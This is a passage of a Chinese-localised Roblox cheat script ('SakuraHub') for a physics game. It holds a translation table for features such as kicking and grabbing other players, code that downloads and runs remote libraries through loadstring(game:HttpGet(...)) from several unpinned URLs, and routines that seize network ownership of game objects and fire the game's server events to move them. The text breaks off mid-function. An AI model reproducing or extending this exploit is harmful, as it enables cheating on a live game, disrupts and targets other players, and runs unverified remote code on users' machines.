    ["Teleport to random waypoint"] = "传送到随机路径点",
    
    ["Warning: This feature is still in beta and may sometimes fail"] = "警告: 此功能仍在测试，有时会失败",
    ["File name (for save)"] = "文件名 (用于保存)",
    ["Export to file (only self objects)"] = "导出到文件 (仅限自身物体)",
    ["Required objects:None"] = "需要物体: 无",
    ["Select file"] = "选择文件",
    ["Refresh file list"] = "刷新文件列表",
    ["Build"] = "建造",
    
    ["Detour radius"] = "绕行半径",
    ["Rotation speed"] = "旋转速度",
    ["Rise speed"] = "上升速度",
    ["Max height"] = "最大高度",
    ["Shaking amplitude"] = "震动幅度",
    ["Shaking frequency"] = "震动频率",
    ["Stop"] = "停止",
    ["Begin (walk over the object to join the tornado)"] = "开始 (走到物体上加入龙卷风)",
    
    ["Grab player"] = "抓取玩家",
    ["Select kick method"] = "选择踢出方法",
    ["Method v2(Stable)"] = "方法 v2 (稳定版)",
    ["Kick Player"] = "踢出玩家",
    ["Stop kick"] = "停止踢出",
    
    ["Changelog"] = "更新日志",
    ["Latest. Beta 1.9 · 2026-10-11"] = "最新版 Beta 1.9 · 2026-10-11",
    ["Minor update"] = "小型更新",
    ["1. New feature"] = "1. 新功能",
    ["You can now extend the grab line to infinite distance"] = "现在你可以将抓取线延长至无限距离",
    ["2. New UI features"] = "2. 新UI功能",
    ["Added announcement and updatelog system"] = "添加了公告和更新日志系统",
    ["Added automatic translation function, You can now find it in the settings"] = "添加了自动翻译功能，你现在可以在设置中找到它",
    ["Visual update"] = "视觉更新",
    ["1. UI Change"] = "1. UI变更",
    ["Now each page has an icon"] = "现在每个页面都有图标",
    ["2. New tab"] = "2. 新标签页",
    ["Added \"Physics\" tab, It has the function of predicting the movement trajectory of objects"] = "添加了“物理”标签页，可以预测物体运动轨迹",
    ["Close"] = "关闭",
    
    ["Notifications"] = "通知",
    ["Clear all"] = "全部清除",
    ["1 min ago"] = "1分钟前",
    ["Don't forget to join my discord server!"] = "别忘了加入我的Discord服务器！",
    ["Do you want to start the tutorial to learn how to use this script?"] = "你想开始教程学习如何使用这个脚本吗？",
    ["Uhh... This doesn't look like FTP game, May not be supported"] = "呃...这看起来不像FTP游戏，可能不支持",
    ["Want revenge on the person who grabbed you? We'll grant your wish!"] = "想报复抓你的人吗？我们会实现你的愿望！",
    ["Take me!"] = "带我去！",
    
    ["Theme preset"] = "主题预设",
    ["Accent color presets (V7 theme names)"] = "强调色预设 (V7主题)",
    ["Default (Dark)"] = "默认 (暗色)",
    ["Accent color"] = "强调色",
    ["Pick a Windows accent color"] = "选择Windows强调色",
    ["Custom accent color"] = "自定义强调色",
    ["Any color, applied on confirm"] = "任意颜色，确认后应用",
    ["Transparency effects"] = "透明效果",
    ["Mica tint and translucent surfaces"] = "云母色调和半透明表面",
    ["Fetch the menu text again"] = "重新获取菜单文本",
    ["Server"] = "服务器",
    ["Rejoin server"] = "重新加入服务器",
    ["Teleport back into this same server"] = "传送回同一服务器",
    ["Key system"] = "秘钥系统",
    ["Clear saved key"] = "清除已保存的秘钥",
    ["Ask for verification again next time"] = "下次再次要求验证",
    ["Version"] = "版本",
    ["Device"] = "设备",
    ["Mobile (touch)"] = "移动端 (触摸)",
    ["Language"] = "语言",
    ["Target language for the menu"] = "菜单的目标语言",
    ["English"] = "英语",
    ["Re-translate now"] = "立即重新翻译",
    ["Controls"] = "控制",
    ["Toggle window"] = "切换窗口",
    ["Show or hide this window"] = "显示或隐藏此窗口",
    ["Floating button"] = "悬浮按钮",
    ["Tap to show / hide the window, drag to move it"] = "点击显示/隐藏窗口，拖动以移动",
    ["Auto translate"] = "自动翻译",
    ["Translate this menu into the language below"] = "将此菜单翻译成以下语言",
}

local sortedKeys = {}
for k, _ in pairs(Translations) do
    table.insert(sortedKeys, k)
end
table.sort(sortedKeys, function(a, b) return #a > #b end)

local function translateString(text)
    if string.match(text, "[\228-\233]") then return text end
    local translated = text
    for _, english in ipairs(sortedKeys) do
        if string.find(translated, english, 1, true) then
            local chinese = Translations[english]
            local pattern = english:gsub("([%(%)%.%%%+%-%*%?%[%]%^%$])", "%%%1")
            translated = string.gsub(translated, pattern, chinese)
        end
    end
    return translated
end

local function processInstance(instance)
    if not (instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox")) then return end
    
    local currentText = instance.Text
    if currentText == "" then return end
    
    local newText = translateString(currentText)
    if newText ~= currentText then
        if not instance:GetAttribute("IsTranslating") then
            instance:SetAttribute("IsTranslating", true)
            instance.Text = newText
            pcall(function()
                instance.TextWrapped = true
                if string.match(newText, "[\228-\233]") and instance.TextSize > 12 then
                    instance.TextSize = 12
                end
            end)
            task.delay(0.1, function()
                if instance then instance:SetAttribute("IsTranslating", false) end
            end)
        end
    end
end

local function hookInstance(instance)
    processInstance(instance)
    instance:GetPropertyChangedSignal("Text"):Connect(function()
        processInstance(instance)
    end)
end

local function traverse(parent)
    for _, child in pairs(parent:GetDescendants()) do
        if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
            hookInstance(child)
        end
    end
end

local function init()
    local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    traverse(playerGui)
    
    local success, coreGui = pcall(function() return game:GetService("CoreGui") end)
    if success then traverse(coreGui) end
    
    local function onDescendantAdded(desc)
        if desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox") then
            task.defer(hookInstance, desc)
        end
    end
    
    playerGui.DescendantAdded:Connect(onDescendantAdded)
    if success and coreGui then coreGui.DescendantAdded:Connect(onDescendantAdded) end
end

init()

do
    local OrionLib = nil
    local loadSuccess, loadErr = pcall(function()
        OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/jadpy/suki/refs/heads/main/orion"))()
    end)

    if not OrionLib then
        local backupSuccess, backupErr = pcall(function()
            OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/oryonhub/Orion/main/source"))()
        end)
        if not OrionLib then
            local backup2Success, backup2Err = pcall(function()
                OrionLib = loadstring(game:HttpGet("https://pastefy.app/OrionLib/raw"))()
            end)
            if not OrionLib then
                error("Failed to load OrionLib")
            end
        end
    end

    _G.OrionLib = OrionLib
end

do
    local OrionLib = _G.OrionLib
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Workspace = game:GetService("Workspace")
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local PhysicsService = game:GetService("PhysicsService")
    local HttpService = game:GetService("HttpService")
    local LocalPlayer = Players.LocalPlayer
    local Camera = workspace.CurrentCamera

    local Theme = {
        BackgroundColor = Color3.fromRGB(139, 69, 19),
        SliderColor = Color3.fromRGB(255, 105, 180),
        TextColor = Color3.fromRGB(255, 255, 255),
    }

    _G.SakuraHub = _G.SakuraHub or {}
    local SH = _G.SakuraHub
    _G.SH = SH
    _G.Theme = Theme
    _G.LocalPlayer = LocalPlayer
    _G.Camera = Camera
    _G.Workspace = Workspace
    _G.RunService = RunService
    _G.ReplicatedStorage = ReplicatedStorage
    _G.PhysicsService = PhysicsService
    _G.HttpService = HttpService
    _G.UserInputService = UserInputService
    _G.Players = Players
end

do
    local SoundService = game:GetService("SoundService")

    local ACTION_SOUND_ID = "rbxassetid://137505070991597"
    local ERROR_SOUND_ID = "rbxassetid://82845990304289"
    local OPEN_CLOSE_SOUND_ID = "rbxassetid://87437544236708"

    local VOLUME_CONFIG = {
        ACTION = 2.5,
        ERROR = 5.0,
        OPEN_CLOSE = 10.0
    }

    function PlaySound(soundId, volume)
        pcall(function()
            local sound = Instance.new("Sound")
            sound.SoundId = soundId
            sound.Volume = volume or 1.0
            sound.Parent = game:GetService("SoundService")
            if not sound.IsLoaded then sound.Loaded:Wait() end
            sound:Play()
            local conn
            conn = sound.Ended:Connect(function()
                if conn then conn:Disconnect() end
                sound:Destroy()
            end)
            task.delay(6, function()
                if sound and sound.Parent then sound:Destroy() end
            end)
        end)
    end

    function PlayActionSound() PlaySound(ACTION_SOUND_ID, VOLUME_CONFIG.ACTION) end
    function PlayErrorSound() PlaySound(ERROR_SOUND_ID, VOLUME_CONFIG.ERROR) end
    function PlayOpenCloseSound() PlaySound(OPEN_CLOSE_SOUND_ID, VOLUME_CONFIG.OPEN_CLOSE) end

    _G.PlaySound = PlaySound
    _G.PlayActionSound = PlayActionSound
    _G.PlayErrorSound = PlayErrorSound
    _G.PlayOpenCloseSound = PlayOpenCloseSound
end

do
    local OrionLib = _G.OrionLib
    local Theme = _G.Theme

    local Window = OrionLib:MakeWindow({
        Name = "🌸さくらhubV0.7[CN BX汉化]🌸",
        HidePremium = false,
        SaveConfig = false,
        IntroEnabled = true,
        IntroText = "🌸さくらhubV0.7[CN BX汉化]🌸 Loading...",
        ThemeColor = Theme.BackgroundColor,
        BackgroundColor = Theme.BackgroundColor,
        TextColor = Theme.TextColor
    })

    _G.Window = Window
end

do
    task.spawn(function()
        local CoreGui = game:GetService("CoreGui")
        local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

        local function tryConnect(gui)
            for _, obj in ipairs(gui:GetDescendants()) do
                if obj:IsA("TextButton") or obj:IsA("ImageButton") then
                    local name = string.lower(obj.Name)
                    if name:find("close") or name:find("minimize") or name:find("exit")
                       or name:find("hide") or name:find("open") or name:find("toggle") then
                        if not obj:GetAttribute("SakuraOpenCloseConnected") then
                            obj:SetAttribute("SakuraOpenCloseConnected", true)
                            obj.MouseButton1Click:Connect(function()
                                PlayOpenCloseSound()
                            end)
                        end
                    end
                end
            end
        end

        task.wait(1.5)

        pcall(function() tryConnect(CoreGui) end)
        pcall(function() tryConnect(PlayerGui) end)

        CoreGui.DescendantAdded:Connect(function(desc)
            if desc:IsA("TextButton") or desc:IsA("ImageButton") then
                local name = string.lower(desc.Name)
                if name:find("close") or name:find("minimize") or name:find("exit") then
                    if not desc:GetAttribute("SakuraOpenCloseConnected") then
                        desc:SetAttribute("SakuraOpenCloseConnected", true)
                        desc.MouseButton1Click:Connect(function()
                            PlayOpenCloseSound()
                        end)
                    end
                end
            end
        end)
    end)
end

do
    local RunService = _G.RunService
    local LocalPlayer = _G.LocalPlayer

    local function applyPinkGradientEffect()
        local CoreGui = game:GetService("CoreGui")
        local time = 0
        local strokes = {}
        local function register(obj) if obj:IsA("UIStroke") then table.insert(strokes, obj) end end
        local function scan(gui) for _, v in ipairs(gui:GetDescendants()) do register(v) end; gui.DescendantAdded:Connect(register) end
        local player = LocalPlayer
        if player then local playerGui = player:WaitForChild("PlayerGui"); scan(CoreGui); scan(playerGui) end
        local function getPinkGradientColor(t)
            local pinkColors = { Color3.fromRGB(255, 182, 193), Color3.fromRGB(255, 105, 180), Color3.fromRGB(219, 112, 147) }
            local position = (math.sin(t * 2) + 1) / 2
            if position < 0.5 then return pinkColors[1]:Lerp(pinkColors[2], position * 2)
            else return pinkColors[2]:Lerp(pinkColors[3], (position - 0.5) * 2) end
        end
        RunService.RenderStepped:Connect(function(dt) time = time + dt * 0.5; for i = #strokes, 1, -1 do local stroke = strokes[i]; if stroke and stroke.Parent then stroke.Color = getPinkGradientColor(time + i * 0.01) else table.remove(strokes, i) end end end)
    end
    pcall(applyPinkGradientEffect)
end

do
    local SH = _G.SH
    SH.ObjectIDConfig = {
        CurrentObjectID = "FireworkSparkler",
        AvailableObjects = {
            "FireworkSparkler", "PalletLightBrown", "GlassBoxGray", "MusicKeyboard",
            "SpookyCandle1", "Tetracube1", "NinjaKatana", "YouDecoy", "BombMissile", 
            "LadderLightBrown", "CreatureBlobman", "DiscoColorBall", "MineralCrystalPink",
            "FloatingIsland", "FlyingToyUfo", "JukeboxBlue", "JukeboxOrange", "CouchBlue",
            "CouchPink", "CouchWhite", "Boombox", "FireworkMissile", "Snowflake",
            "SpookyCandle5", "MineralDiamond", "TractorGreen", "TractorOrange", "TractorRed"
        }
    }
end

-- ============================================================================
-- Block 6: Configuration for Each Feature
-- ============================================================================
do
    local SH = _G.SH

    SH.FeatherConfig = { Enabled = false, spacing = 3, heightOffset = 2, backwardOffset = 3, maxSparklers = 20, tiltAngle = 45, waveSpeed = 2, baseAmplitude = 1 }
    SH.MagicCircleConfig = { Enabled = false, Height = 5.0, Diameter = 5.0, ObjectCount = 10, RotationSpeed = 20.0, SymbolType = "Ring", GlowEffect = true }
    SH.HeartConfig = { Enabled = false, Height = 5.0, Size = 5.0, ObjectCount = 12, RotationSpeed = 1.0, PulseSpeed = 2.0, PulseAmplitude = 0.5, FollowPlayer = true }
    SH.BigHeartConfig = { Enabled = false, Height = 8.0, Size = 10.0, ObjectCount = 20, RotationSpeed = 0.5, RotationSpeedMax = 10.0, PulseSpeed = 1.0, PulseSpeedMax = 10.0, PulseAmplitude = 1.0, FollowPlayer = true, HeartScale = 2.0, VerticalStretch = 1.2 }
    SH.StarOfDavidConfig = { Enabled = false, Height = 5.0, Size = 5.0, ObjectCount = 12, RotationSpeed = 1.0, PulseSpeed = 1.5, FollowPlayer = true, TriangleHeight = 0.5 }
    SH.StarConfig = { Enabled = false, Height = 5.0, ObjectCount = 10, RotationSpeed = 1.0, TwinkleSpeed = 2.0, FollowPlayer = true, OuterRadius = 5.0, InnerRadius = 2.0 }
    SH.Star2Config = { Enabled = false, Height = 10.0, Size = 15.0, ObjectCount = 24, RotationSpeed = 5.0, RotationSpeedMax = 30.0, PulseSpeed = 8.0, PulseSpeedMax = 20.0, PulseAmplitude = 2.0, FollowPlayer = true, RayCount = 12, RayLength = 3.0, RayLengthMax = 10.0, JitterSpeed = 5.0, JitterAmount = 1.0, MaxDistance = 50.0 }
    SH.SphereConfig = { Enabled = false, BaseHeight = 0, Radius = 5.0, ObjectCount = 20, HorizontalRotationSpeed = 2.0, VerticalRotationSpeed = 1.0, FollowPlayer = true, Latitudes = 3, Longitudes = 6, PulseSpeed = 1.0, PulseAmplitude = 0.5 }
    SH.FerrisWheelConfig = { Enabled = false, Height = 15.0, Radius = 10.0, ObjectCount = 12, RotationSpeed = 1.0, RotationSpeedMax = 5.0, FollowPlayer = true, VerticalCircle = true, FixedDirection = true, FixedYaw = 0, FixedPitch = 0, FixedRoll = 0 }
    SH.AnimN1Config = { Enabled = false, Height = 10.0, Radius = 15.0, ObjectCount = 50, RotationSpeed = 20.0, PulseSpeed = 5.0, PulseAmount = 10.0, FollowPlayer = true }
    SH.AnimN2Config = { Enabled = false, BaseHeight = 5.0, TopHeight = 30.0, Radius = 8.0, ObjectCount = 60, RotationSpeed = 15.0, RiseSpeed = 2.0, ChaosFactor = 3.0, FollowPlayer = true }
    SH.AnimN3Config = { Enabled = false, Height = 8.0, ExplosionRadius = 25.0, ObjectCount = 80, CycleSpeed = 2.0, Randomness = 5.0, FollowPlayer = true }

    SH.WingConfig = {
        Enabled = false, VerticalOffset = 2.0, Spread = 5.0, ObjectCount = 10,
        FlapShape = 2.0, FlapSpeed = 1.0, FlapAmount = 3.0, ChainDelay = 0.01
    }

    SH.SaturnConfig = {
        Enabled = false, Mode = "saturn", MaxVel = 700, Strength = 16, BaseHeight = 6,
        RingRadius = 12, RingSpeed = 1.5, SphereRadius = 5, SphereSpeed = 1,
        SphereLayers = 5, PlotRadius = 15, PlotHeight = 0.5, ModelName = "FireworkSparkler"
    }

    SH.PianoConfig = {
        Enabled = false, FollowPlayer = true, SongData = nil, IsPlaying = false,
        Keyboard = nil, UpdateConnection = nil, OriginalCollisions = {},
        KeyMap = {
            ["1"] = "Key1C", ["2"] = "Key1D", ["3"] = "Key1E", ["4"] = "Key1F", 
            ["5"] = "Key1G", ["6"] = "Key1A", ["7"] = "Key1B", ["8"] = "Key2C",
            ["9"] = "Key2D", ["0"] = "Key2E", ["q"] = "Key2F", ["w"] = "Key2G",
            ["e"] = "Key2A", ["r"] = "Key2B", ["t"] = "Key3C",
            ["f"] = "Key1Csharp", ["g"] = "Key1Dsharp", ["h"] = "Key1Fsharp",
            ["j"] = "Key1Gsharp", ["k"] = "Key1Asharp", ["l"] = "Key2Csharp",
            ["z"] = "Key2Dsharp", ["x"] = "Key2Fsharp", ["c"] = "Key2Gsharp",
            ["v"] = "Key2Asharp"
        }
    }

    SH.VerticalHeartConfig = {
        Enabled = false, Height = 5.0, Size = 5.0, ObjectCount = 12,
        RotationSpeed = 1.0, PulseSpeed = 2.0, PulseAmplitude = 0.5, FollowPlayer = true
    }

    SH.VerticalBigHeartConfig = {
        Enabled = false, Height = 8.0, Size = 10.0, ObjectCount = 20,
        RotationSpeed = 0.5, RotationSpeedMax = 10.0, PulseSpeed = 1.0, PulseSpeedMax = 10.0,
        PulseAmplitude = 1.0, FollowPlayer = true, HeartScale = 2.0
    }

    SH.SuperRingConfig = {
        Enabled = false, BaseHeight = 2.0, Height = 10.0, Radius = 3.0,
        ObjectCount = 16, RotationSpeed = 2.0, SpiralSpeed = 1.0, WaveSpeed = 1.5,
        WaveAmplitude = 0.5, FollowPlayer = true, TornadoEffect = true,
    }
end

-- ============================================================================
-- Block 7: Saturn Settings
-- ============================================================================
do
    local PhysicsService = _G.PhysicsService
    local SATURN_GROUP_NAME = "SparklerGroup"
    pcall(function()
        PhysicsService:RegisterCollisionGroup(SATURN_GROUP_NAME)
        PhysicsService:CollisionGroupSetCollidable(SATURN_GROUP_NAME, SATURN_GROUP_NAME, false)
    end)
    _G.SATURN_GROUP_NAME = SATURN_GROUP_NAME
end

-- ============================================================================
-- Block 8: State Variables
-- ============================================================================
do
    local SH = _G.SH
    SH.featherToys = {}; SH.featherRowPoints = {}; SH.featherAssignedToys = {}; SH.featherLoopConn = nil; SH.featherTime = 0
    SH.magicCircleList = {}; SH.magicCircleLoopConn = nil; SH.magicCircleTAccum = 0
    SH.heartToys = {}; SH.heartPoints = {}; SH.heartAssignedToys = {}; SH.heartLoopConn = nil; SH.heartTime = 0
    SH.bigHeartToys = {}; SH.bigHeartPoints = {}; SH.bigHeartAssignedToys = {}; SH.bigHeartLoopConn = nil; SH.bigHeartTime = 0
    SH.starOfDavidToys = {}; SH.starOfDavidPoints = {}; SH.starOfDavidAssignedToys = {}; SH.starOfDavidLoopConn = nil; SH.starOfDavidTime = 0
    SH.starToys = {}; SH.starPoints = {}; SH.starAssignedToys = {}; SH.starLoopConn = nil; SH.starTime = 0
    SH.star2Toys = {}; SH.star2Points = {}; SH.star2AssignedToys = {}; SH.star2LoopConn = nil; SH.star2Time = 0
    SH.sphereToys = {}; SH.spherePoints = {}; SH.sphereAssignedToys = {}; SH.sphereLoopConn = nil; SH.sphereTime = 0
    SH.ferrisWheelToys = {}; SH.ferrisWheelPoints = {}; SH.ferrisWheelAssignedToys = {}; SH.ferrisWheelLoopConn = nil; SH.ferrisWheelTime = 0
    SH.animN1Toys = {}; SH.animN1Points = {}; SH.animN1AssignedToys = {}; SH.animN1LoopConn = nil; SH.animN1Time = 0
    SH.animN2Toys = {}; SH.animN2Points = {}; SH.animN2AssignedToys = {}; SH.animN2LoopConn = nil; SH.animN2Time = 0
    SH.animN3Toys = {}; SH.animN3Points = {}; SH.animN3AssignedToys = {}; SH.animN3LoopConn = nil; SH.animN3Time = 0
    SH.wingList = {}; SH.wingLoopConn = nil; SH.wingTime = 0
    SH.saturnList = {}; SH.saturnLoopConn = nil; SH.saturnCachedHRP = nil; SH.saturnTAccum = 0
    SH.verticalHeartToys = {}; SH.verticalHeartPoints = {}; SH.verticalHeartAssignedToys = {}; SH.verticalHeartLoopConn = nil; SH.verticalHeartTime = 0
    SH.verticalBigHeartToys = {}; SH.verticalBigHeartPoints = {}; SH.verticalBigHeartAssignedToys = {}; SH.verticalBigHeartLoopConn = nil; SH.verticalBigHeartTime = 0
    SH.superRingToys = {}; SH.superRingPoints = {}; SH.superRingAssignedToys = {}; SH.superRingLoopConn = nil; SH.superRingTime = 0
end

-- ============================================================================
-- Block 9: Piano Events
-- ============================================================================
do
    local ReplicatedStorage = _G.ReplicatedStorage
    local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
    local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
    _G.SetNetworkOwner = SetNetworkOwner
end

-- ============================================================================
-- Block 10: Common Functions
-- ============================================================================
do
    local SH = _G.SH
    local OrionLib = _G.OrionLib

    function findObjects()
        local toys = {}
        for _, item in ipairs(workspace:GetDescendants()) do
            if item:IsA("Model") and item.Name == SH.ObjectIDConfig.CurrentObjectID then
                local alreadyAdded = false
                for _, existingToy in ipairs(toys) do if existingToy == item then alreadyAdded = true; break end end
                if not alreadyAdded then table.insert(toys, item) end
            end
        end
        table.sort(toys, function(a, b) return a.Name < b.Name end)
        return toys
    end
    _G.findObjects = findObjects

    function getPrimaryPart(model)
        if model.PrimaryPart then return model.PrimaryPart end
        local potentialParts = {"Handle", "Main", "Part", "Base", "Sparkler", "Firework", "Blade", "Candle", "Keyboard", "Box", "Decoy", "Missile", "Ladder", "Blob", "Ball", "Crystal", "Island", "Ufo", "Jukebox", "Couch", "Boombox", "Snowflake", "Diamond", "Tractor"}
        for _, partName in ipairs(potentialParts) do
            local part = model:FindFirstChild(partName)
            if part and part:IsA("BasePart") then return part end
        end
        for _, child in ipairs(model:GetChildren()) do if child:IsA("BasePart") then return child end end
        return nil
    end
    _G.getPrimaryPart = getPrimaryPart

    function attachPhysics(part, pValue, dValue)
        if not part then return nil, nil end
        local existingBG = part:FindFirstChildOfClass("BodyGyro")
        local existingBP = part:FindFirstChildOfClass("BodyPosition")
        if existingBG and existingBP then return existingBG, existingBP end
        if existingBG then existingBG:Destroy() end
        if existingBP then existingBP:Destroy() end
        local BP = Instance.new("BodyPosition"); local BG = Instance.new("BodyGyro")
        BP.P = pValue or 15000; BP.D = dValue or 200; BP.MaxForce = Vector3.new(1, 1, 1) * 1e10; BP.Parent = part
        BG.P = pValue or 15000; BG.D = dValue or 200; BG.MaxTorque = Vector3.new(1, 1, 1) * 1e10; BG.Parent = part
        return BG, BP
    end
    _G.attachPhysics = attachPhysics

    function changeObjectID(id)
        if id == SH.ObjectIDConfig.CurrentObjectID then return end
        PlayActionSound()
        SH.ObjectIDConfig.CurrentObjectID = id
        local activeFunctions = {}
        if SH.FeatherConfig.Enabled then table.insert(activeFunctions, _G.toggleFeather) end
        if SH.MagicCircleConfig.Enabled then table.insert(activeFunctions, _G.toggleMagicCircle) end
        if SH.HeartConfig.Enabled then table.insert(activeFunctions, _G.toggleHeart) end
        if SH.BigHeartConfig.Enabled then table.insert(activeFunctions, _G.toggleBigHeart) end
        if SH.StarOfDavidConfig.Enabled then table.insert(activeFunctions, _G.toggleStarOfDavid) end
        if SH.StarConfig.Enabled then table.insert(activeFunctions, _G.toggleStar) end
        if SH.Star2Config.Enabled then table.insert(activeFunctions, _G.toggleStar2) end
        if SH.SphereConfig.Enabled then table.insert(activeFunctions, _G.toggleSphere) end
        if SH.FerrisWheelConfig.Enabled then table.insert(activeFunctions, _G.toggleFerrisWheel) end
        if SH.AnimN1Config.Enabled then table.insert(activeFunctions, _G.toggleAnimN1) end
        if SH.AnimN2Config.Enabled then table.insert(activeFunctions, _G.toggleAnimN2) end
        if SH.AnimN3Config.Enabled then table.insert(activeFunctions, _G.toggleAnimN3) end
        if SH.WingConfig.Enabled then table.insert(activeFunctions, _G.toggleWing) end
        if SH.SaturnConfig.Enabled then table.insert(activeFunctions, _G.toggleSaturn) end
        if SH.PianoConfig.Enabled then table.insert(activeFunctions, _G.togglePiano) end
        if SH.VerticalHeartConfig.Enabled then table.insert(activeFunctions, _G.toggleVerticalHeart) end
        if SH.VerticalBigHeartConfig.Enabled then table.insert(activeFunctions, _G.toggleVerticalBigHeart) end
        if SH.SuperRingConfig.Enabled then table.insert(activeFunctions, _G.toggleSuperRing) end
        for _, func in ipairs(activeFunctions) do if func then func(false) end end
        task.wait(0.5)
        for _, func in ipairs(activeFunctions) do if func then func(true) end end
        OrionLib:MakeNotification({ Name = "Object ID Changed", Content = "Switched to " .. id, Time = 3 })
    end
    _G.changeObjectID = changeObjectID
end

-- ============================================================================
-- Block 11: Piano Functions
-- ============================================================================
do
    local SH = _G.SH
    local Workspace = _G.Workspace
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local SetNetworkOwner = _G.SetNetworkOwner
    local HttpService = _G.HttpService
    local OrionLib = _G.OrionLib

    function getMusicKeyboard()
        local myName = LocalPlayer.Name
        local spawnedToys = Workspace:FindFirstChild(myName .. "SpawnedInToys")
        if spawnedToys then
            local kb = spawnedToys:FindFirstChild("MusicKeyboard")
            if kb then return kb end
        end
        local plots = Workspace:FindFirstChild("Plots")
        local plotItems = Workspace:FindFirstChild("PlotItems")
        if plots and plotItems then
            for _, plot in ipairs(plots:GetChildren()) do
                local sign = plot:FindFirstChild("PlotSign")
                local ownerObj = sign and (sign:FindFirstChild("ThisPlotsOwners") or sign:FindFirstChild("Owner"))
                if ownerObj then
                    local val = ownerObj:FindFirstChild("Value") or ownerObj
                    local data = val:FindFirstChild("Data") or val
                    if (data:IsA("StringValue") and data.Value == myName) then
                        local myPlotItems = plotItems:FindFirstChild(plot.Name)
                        if myPlotItems then
                            local kb = myPlotItems:FindFirstChild("MusicKeyboard")
                            if kb then return kb end
                        end
                        local build = plot:FindFirstChild("Build")
                        local kb = build and build:FindFirstChild("MusicKeyboard")
                        if kb then return kb end
                    end
                end
            end
        end
        for _, item in ipairs(Workspace:GetChildren()) do
            if item.Name == "MusicKeyboard" and item:IsA("Model") then
                local ownerValue = item:FindFirstChild("Owner") or item:FindFirstChild("PartOwner")
                if ownerValue and ownerValue:IsA("StringValue") and ownerValue.Value == myName then
                    return item
                end
            end
        end
        return nil
    end
    _G.getMusicKeyboard = getMusicKeyboard

    function stopPiano()
        if SH.PianoConfig.UpdateConnection then
            SH.PianoConfig.UpdateConnection:Disconnect()
            SH.PianoConfig.UpdateConnection = nil
        end
        if SH.PianoConfig.Keyboard and SH.PianoConfig.Keyboard.Parent then
            local pp = SH.PianoConfig.Keyboard:FindFirstChild("Main", true) or SH.PianoConfig.Keyboard.PrimaryPart
            if pp then
                for _, child in ipairs(pp:GetChildren()) do
                    if child:IsA("Attachment") or child:IsA("AlignPosition") or child:IsA("AlignOrientation") then
                        child:Destroy()
                    end
                end
            end
        end
        for part, canCollide in pairs(SH.PianoConfig.OriginalCollisions) do
            if part and part.Parent then part.CanCollide = canCollide end
        end
        SH.PianoConfig.OriginalCollisions = {} 
    end
    _G.stopPiano = stopPiano

    function setupPianoFollow()
        if not SH.PianoConfig.Keyboard then SH.PianoConfig.Keyboard = getMusicKeyboard() end
        if not SH.PianoConfig.Keyboard then PlayErrorSound() return end
        if SH.PianoConfig.UpdateConnection then return end
        local mainPart = SH.PianoConfig.Keyboard:FindFirstChild("Main", true) or SH.PianoConfig.Keyboard.PrimaryPart
        if not mainPart then PlayErrorSound() return end
        for _, part in ipairs(SH.PianoConfig.Keyboard:GetDescendants()) do
            if part:IsA("BasePart") then
                if SH.PianoConfig.OriginalCollisions[part] == nil then
                    SH.PianoConfig.OriginalCollisions[part] = part.CanCollide
                end
                part.CanCollide = false; part.CanTouch = false; part.CanQuery = false
                part.Anchored = false; part.Massless = true
                part.AssemblyLinearVelocity = Vector3.zero
                part.AssemblyAngularVelocity = Vector3.zero
                pcall(function() part:SetNetworkOwner(LocalPlayer) end)
            end
        end
        local pp = mainPart
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if root then
            local offset = CFrame.new(0, -1.5, -2) * CFrame.Angles(0, math.rad(180), 0)
            pp.CFrame = root.CFrame * offset
        end
        local a0 = Instance.new("Attachment", pp)
        local ap = Instance.new("AlignPosition", pp)
        ap.Attachment0 = a0
        ap.Mode = Enum.PositionAlignmentMode.OneAttachment
        ap.MaxForce = 1e9; ap.Responsiveness = 200
        local ao = Instance.new("AlignOrientation", pp)
        ao.Attachment0 = a0
        ao.Mode = Enum.OrientationAlignmentMode.OneAttachment
        ao.MaxTorque = 1e9; ao.Responsiveness = 200
        SH.PianoConfig.UpdateConnection = RunService.RenderStepped:Connect(function()
            local char = LocalPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            if not SH.PianoConfig.Keyboard or not SH.PianoConfig.Keyboard.Parent then stopPiano() return end
            if math.random() < 0.05 then pcall(function() pp:SetNetworkOwner(LocalPlayer) end) end
            local baseCF = root.CFrame
            local offset = CFrame.new(0, -1.5, -2) * CFrame.Angles(0, math.rad(180), 0)
            local targetCF = baseCF * offset
            ap.Position = targetCF.Position
            ao.CFrame = targetCF
        end)
    end
    _G.setupPianoFollow = setupPianoFollow

    function pressPianoKey(keyName)
        local targetKeyboard = getMusicKeyboard()
        if not targetKeyboard then
            SH.PianoConfig.Keyboard = nil
            targetKeyboard = getMusicKeyboard()
            if not targetKeyboard then PlayErrorSound() return end
        end
        local key = targetKeyboard:FindFirstChild(keyName, true)
        if key and key:IsA("BasePart") then
            SetNetworkOwner:FireServer(key, key.CFrame)
            task.wait(0.15)
        end
    end
    _G.pressPianoKey = pressPianoKey

    function playSongFromJSONString(jsonString)
        if SH.PianoConfig.IsPlaying then return end
        local songData
        local success, err = pcall(function() return HttpService:JSONDecode(jsonString) end)
        if not success or type(err) ~= "table" then
            PlayErrorSound()
            OrionLib:MakeNotification({ Name = "Error", Content = "Invalid JSON format", Time = 5 })
            return
        end
        songData = err
        SH.PianoConfig.IsPlaying = true
        task.spawn(function()
            if not SH.PianoConfig.Keyboard then SH.PianoConfig.Keyboard = getMusicKeyboard() end
            for i, note in ipairs(songData) do
                if not SH.PianoConfig.IsPlaying then break end
                local rawKey = tostring(note.key)
                local keyName = rawKey
                if not string.match(rawKey, "^Key") then
                    keyName = SH.PianoConfig.KeyMap[rawKey] or rawKey
                end
                local delayTime = note.delay or 0.1
                task.spawn(function() pressPianoKey(keyName) end)
